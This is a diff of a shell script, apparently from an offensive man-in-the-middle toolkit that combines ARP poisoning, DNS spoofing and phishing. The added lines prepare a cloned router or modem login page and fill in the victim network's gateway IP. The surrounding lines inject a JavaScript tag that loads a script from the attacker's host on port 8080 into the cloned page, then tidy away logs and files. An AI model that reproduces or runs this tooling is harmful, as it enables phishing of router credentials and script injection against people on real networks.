@@ -1707,6 +1707,11 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
   # building cloned login modem webpage
   cd $IPATH/bin/phishing/router-modem
   cp index.html index.rb > /dev/null 2>&1
+  cp login.html login.rb > /dev/null 2>&1
+
+  # grab modem ip addr
+  MIP=`route -n | grep "UG" | awk {'print $2'} | tr -d '\n'`
+  sed -i "s/MoDemIP/$MIP/" login.html
   echo ${BlueF}[☠]${white} Inject javascript Into clone webpage${RedF}!${Reset};
   sleep 1
   sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$IP:8080\/support\/test.js'><\/script><\/body>/g" index.html > copy.html
@@ -1766,6 +1771,7 @@ echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
   mv $LoGmSf/*.txt $IPATH/logs > /dev/null 2>&1
   mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
   mv $IPATH/bin/phishing/router-modem/index.rb $IPATH/bin/phishing/router-modem/index.html
+  mv $IPATH/bin/phishing/router-modem/login.rb $IPATH/bin/phishing/router-modem/login.html
   mv /tmp/etter.dns $Edns > /dev/null 2>&1
   rm $IPATH/output/retrieve.log > /dev/null 2>&1
   rm $ApachE/index.html > /dev/null 2>&1
